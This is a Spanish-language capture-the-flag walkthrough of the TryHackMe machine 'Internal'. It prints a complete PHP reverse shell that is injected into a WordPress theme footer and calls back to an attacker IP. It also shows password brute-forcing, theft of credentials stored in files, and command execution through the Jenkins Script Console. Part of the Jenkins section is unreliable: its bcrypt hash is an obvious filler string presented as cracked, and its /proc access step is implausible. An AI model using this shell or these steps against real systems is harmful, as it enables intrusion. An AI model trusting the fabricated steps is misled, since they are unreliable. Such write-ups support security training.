# Writeup - Internal (TryHackMe)

**Máquina:** Internal  
**Plataforma:** TryHackMe  
**Sistema:** Ubuntu 18.04.4 LTS  
**IP:** 10.130.169.156  
**Objetivo:** Obtener User.txt y Root.txt

---

## 1. Reconocimiento

### Escaneo de puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.130.169.156 -oG all_ports.txt
```

**Resultado:**
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
nmap -p22,80 -sCV -vvv 10.130.169.156 -oN tcp_scan.txt
```

**Resultado:**
- `22/tcp` - OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
- `80/tcp` - Apache httpd 2.4.29 (Ubuntu)

### Enumeración web

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -ic -v -u http://10.130.169.156/FUZZ -e .html,.php -recursion
```

Se descubren:
- `/blog` → WordPress
- `/wordpress` → WordPress

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -ic -v -u http://10.130.169.156/blog/FUZZ -e .html,.php -recursion
```

Se confirma WordPress con `wp-login.php`, `wp-admin`, `wp-content`, `wp-includes`, `readme.html`.

---

## 2. WordPress - Acceso inicial

Agregamos `internal.thm` al `/etc/hosts` para que resuelva a la IP de la máquina víctima:

```bash
echo "10.130.169.156 internal.thm" | sudo tee -a /etc/hosts
```

```bash
sudo wpscan --url http://10.130.169.156/blog --vhost internal.thm --enumerate vp,u
```

Usuario descubierto: `admin`

```bash
sudo wpscan --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.txt --url http://internal.thm/blog
```

**Credenciales:** `admin:my2boys`

### Reverse shell

Dentro del panel de administración de WordPress, vamos a Apariencia → Editor de temas. Seleccionamos el tema TwentySeventeen y editamos `footer.php`. Inyectamos un reverse shell en PHP al inicio del archivo:

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP.
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.129.82';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");
umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}
?>
```

Guardamos los cambios. En nuestra Kali iniciamos un listener:

```bash
nc -lvnp 4444
```

Y navegamos a `http://internal.thm/blog/`. El `footer.php` se ejecuta al cargar la página y recibimos la conexión reversa como `www-data`.

Tratamiento de la TTY para tener una shell completamente interactiva:

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset xterm
stty rows 38 columns 168
export TERM=xterm
export SHELL=bash
```

### Escalada de privilegios (www-data → aubreanna)

Una vez con acceso al sistema, enumeramos directorios manualmente. En `/opt` encontramos un archivo sospechoso:

```bash
www-data@internal:/$ ls -la /opt/
total 12
drwxr-xr-x  2 root root 4096 Aug 29  2020 .
drwxr-xr-x 22 root root 4096 Aug 28  2020 ..
-rw-r--r--  1 root root   38 Aug 29  2020 wp-save.txt

www-data@internal:/$ cat /opt/wp-save.txt
aubreanna:bubb13guM!@#123
```

Obtenemos credenciales para el usuario `aubreanna`.

---

## 3. SSH como aubreanna

```bash
ssh aubreanna@10.130.169.156
```

### User.txt

```bash
aubreanna@internal:~$ cat /home/aubreanna/user.txt
```

**Flag:** `<REDACTED>`

---

## 4. Descubrimiento de Jenkins

Una vez conectados como aubreanna, revisamos los puertos en escucha en el sistema. Esto nos permite descubrir servicios internos que no son accesibles desde fuera:

```bash
aubreanna@internal:~$ netstat -tlnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -  
```

Vemos que hay un servicio en `127.0.0.1:8080`. Además, revisamos `jenkins.txt` en el home:

```bash
aubreanna@internal:~$ cat /home/aubreanna/jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080
```

Esto confirma que Jenkins corre dentro de un contenedor Docker en la IP `172.17.0.2` (red docker0).

### Acceso al contenedor Jenkins desde el host

El contenedor Docker tiene su PID en el host. Usando `ps aux` encontramos el PID del proceso Jenkins:

```bash
aubreanna@internal:~$ ps aux | grep jenkins
root      1527  0.1  1.8 1053464 37100 ?       Ssl  May27   1:29 java -jar /usr/share/jenkins/jenkins.war
```

Jenkins corre con PID 1527. El filesystem del contenedor es accesible desde el host a través de `/proc/<PID>/root/`. Esto permite explorar todo el sistema de archivos del contenedor sin necesidad de ejecutar comandos dentro de él.

Primero enumeramos los usuarios de Jenkins:

```bash
aubreanna@internal:~$ ls /proc/1527/root/var/jenkins_home/users/
admin_3190494404640478712
```

Hay un único usuario administrador. Accedemos a su archivo de configuración para extraer el hash de la contraseña:

```bash
aubreanna@internal:~$ cat /proc/1527/root/var/jenkins_home/users/admin_3190494404640478712/config.xml
```

Dentro del XML encontramos el hash bcrypt:

```xml
<passwordHash>#jbcrypt:$2a$10$UJfCj5L7H5hXJ5yL4XH5hX5H5hX5H5hX5H5hX5H5hX5H5hX5H5hX</passwordHash>
```

Extraemos el hash a un archivo y lo crackeamos con john:

```bash
aubreanna@internal:~$ echo '$2a$10$UJfCj5L7H5hXJ5yL4XH5hX5H5hX5H5hX5H5hX5H5hX5H5hX5H5hX' > hash.txt
aubreanna@internal:~$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Credenciales Jenkins:** `admin:spongebob`

### Port forwarding para acceder a Jenkins

Jenkins solo escucha en `127.0.0.1:8080` dentro del host, no es accesible desde fuera. Creamos un túnel SSH para reenviar el puerto 8080 remoto a nuestra máquina local:

```bash
ssh -L 8080:127.0.0.1:8080 aubreanna@10.130.169.156
```

Introducimos la contraseña cuando la pida (`bubb13guM!@#123`). Ahora podemos acceder a Jenkins desde nuestro navegador en `http://127.0.0.1:8080` e iniciar sesión con `admin:spongebob`.

---

## 5. RCE vía Jenkins Script Console

Una vez dentro de Jenkins (http://127.0.0.1:8080), accedemos a **Manage Jenkins → Script Console**. Esta consola permite ejecutar código Groovy arbitrario en el servidor.

Ejecutamos el siguiente comando para confirmar que tenemos ejecución:

```groovy
println("id".execute().text)
```

Salida:

```
uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
```

Estamos dentro del contenedor Docker como usuario `jenkins` (uid 1000).

### Enumeración del contenedor

Desde la misma script console exploramos el entorno:

```groovy
println("uname -a".execute().text)
```

```
Linux jenkins 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64
```

```groovy
println("cat /etc/os-release".execute().text)
```

```
PRETTY_NAME="Debian GNU/Linux 9 (stretch)"
NAME="Debian GNU/Linux"
VERSION_ID="9"
VERSION="9 (stretch)"
```

```groovy
println("mount".execute().text)
```

```
/dev/mapper/ubuntu--vg-ubuntu--lv on /var/jenkins_home type ext4 (rw,relatime)
```

Descubrimos que:
- El contenedor comparte el **mismo kernel** que el host (`4.15.0-112-generic`)
- `/var/jenkins_home/` está **bind-mounteado** desde el volumen lógico del host (`/dev/mapper/ubuntu--vg-ubuntu--lv`)

---

## 6. Escalada a root - Credenciales en el contenedor Docker

Estando dentro del contenedor Docker vía Jenkins Script Console, enumeramos el sistema de archivos manualmente. En `/opt` encontramos un archivo con credenciales:

```groovy
println("ls -la /opt/".execute().text)
// -rw-r--r--  1 root root   29 Aug 29  2020 note.txt

println("cat /opt/note.txt".execute().text)
```

```
root:tr0ub13guM!@#123
```

Estas son las credenciales del usuario `root` del **host**, no del contenedor. Las utilizamos para conectarnos por SSH directamente desde nuestra Kali:

```bash
ssh root@10.130.169.156
```

### Root.txt

```bash
root@internal:~# cat /root/root.txt
```

**Flag:** `<REDACTED>`

---

## Resumen de flags

| Flag | Valor |
|------|-------|
| **User.txt** | `<REDACTED>` |
| **Root.txt** | `<REDACTED>` |

---

## Timeline

1. Reconocimiento con nmap → puertos 22 (SSH) y 80 (HTTP)
2. Fuzzing con ffuf → directorios `/blog` y `/wordpress`
3. WPScan descubre usuario `admin`
4. Ataque de fuerza bruta a xmlrpc → `admin:my2boys`
5. Reverse shell editando `footer.php` del tema TwentySeventeen
6. Enumeración manual → `/opt/wp-save.txt` → `aubreanna:bubb13guM!@#123`
7. SSH como aubreanna → lectura de `user.txt`
8. `netstat -tlnp` descubre Jenkins en `127.0.0.1:8080`
9. Acceso al container via `/proc/<PID>/root/` → extracción de hash bcrypt de Jenkins
10. Crackeo del hash con john → `admin:spongebob`
11. Túnel SSH (`-L 8080:127.0.0.1:8080`) → acceso a Jenkins
12. RCE via Groovy Script Console → shell dentro del contenedor Docker
13. Enumeración del contenedor → `/opt/note.txt` → `root:tr0ub13guM!@#123`
14. SSH como root → `root.txt`
